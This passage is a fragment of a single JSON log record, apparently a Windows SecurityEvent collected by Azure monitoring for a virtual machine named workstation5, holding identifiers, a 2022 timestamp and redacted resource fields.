SERVICE","SubjectUserSid":"S-1-5-19","SourceComputerId":"29acc230-2f13-49db-9ef2-c9b20229a10d","EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","MG":"00000000-0000-0000-0000-000000000001","TimeCollected":"2022-05-13T08:54:38.145Z","ManagementGroupName":"AOI-redacted","Type":"SecurityEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
